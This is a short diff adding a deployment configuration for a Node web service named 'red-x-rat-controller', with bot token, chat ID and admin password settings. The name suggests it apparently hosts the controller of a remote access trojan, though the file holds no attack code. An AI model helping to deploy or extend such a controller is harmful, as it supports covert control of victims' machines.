@@ -1,0 +1,15 @@
+services:
+  - type: web
+    name: red-x-rat-controller
+    runtime: node
+    buildCommand: npm install
+    startCommand: node server.js
+    envVars:
+      - key: NODE_ENV
+        value: production
+      - key: BOT_TOKEN
+        sync: false
+      - key: BOT_CHAT_ID
+        sync: false
+      - key: ADMIN_PASSWORD
+        generateValue: true
